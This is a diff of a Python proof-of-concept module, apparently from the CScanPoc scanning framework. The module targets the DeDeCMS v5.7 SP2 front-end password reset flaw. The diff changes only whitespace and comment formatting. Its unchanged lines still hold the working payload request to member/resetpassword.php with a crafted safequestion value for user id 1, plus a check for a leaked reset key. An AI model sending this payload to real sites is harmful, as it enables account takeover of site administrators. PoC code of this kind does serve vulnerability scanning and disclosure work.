@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'DedeCMS_0051_L' # 平台漏洞编号，留空
+    vuln_id = 'DedeCMS_0051_L'  # 平台漏洞编号，留空
     name = 'DeDeCMS v5.7 SP2正式版前台任意用户密码修改漏洞'  # 漏洞名称
     level = VulnLevel.MED  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2018-01-11'  # 漏洞公布时间
     desc = '''
         DedeCms（织梦内容管理系统) 是一款PHP开源网站管理系统。 
@@ -33,20 +34,20 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_V5.7_
-            #先注册一个帐号并登录，然后访问：
-            #获取cookies
+
+            # https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_V5.7_
+            # 先注册一个帐号并登录，然后访问：
+            # 获取cookies
             cookies = {}
             '''
             raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
             for line in raw_cookies.split(';'):  
                 key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                 cookies[key]=value 
-            ''' 
+            '''
             payload = "/member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=1"
             url = self.target + payload
-            r = requests.get(url, cookies=cookies) 
+            r = requests.get(url, cookies=cookies)
 
             if 'key=' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -57,6 +58,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
